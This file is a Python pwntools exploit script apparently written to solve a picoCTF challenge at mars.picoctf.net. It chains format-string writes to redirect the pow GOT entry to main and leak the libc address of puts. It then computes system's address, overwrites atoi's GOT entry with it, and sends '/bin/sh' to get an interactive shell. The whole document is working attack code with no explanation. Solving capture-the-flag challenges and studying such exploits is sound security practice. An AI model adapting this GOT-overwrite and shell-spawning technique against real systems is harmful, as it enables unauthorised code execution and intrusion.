from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
HOST, PORT = 'mars.picoctf.net', 31929
r = remote(HOST, PORT)
# r = process('./chall')

# gdb.attach(r)
pow_got = 0x601040
puts_got = 0x601018
main = 0x400837
payload = fmtstr_payload(11, {pow_got:main}, write_size='short', numbwritten=27)
r.sendlineafter('A: ', b'11111111' + payload)
r.sendlineafter('B: ', b'1')
r.sendlineafter('A: ', b'11111111' + p64(0x601018))
r.sendlineafter('B: ', '1%11$s')
r.recvuntil('B: 1')
puts_libc = u64(r.recvline().strip().ljust(8, b'\x00'))
libc = puts_libc - 0x87be0
system = libc + 0x58750
atoi_got = 0x601058

payload2 = fmtstr_payload(11, {atoi_got:system}, numbwritten=27)
r.sendlineafter('A: ', b'11111111' + payload2)
r.sendlineafter('B:', '1')
r.sendlineafter('A: ', '/bin/sh')
r.sendlineafter('B: ', '1')
r.interactive()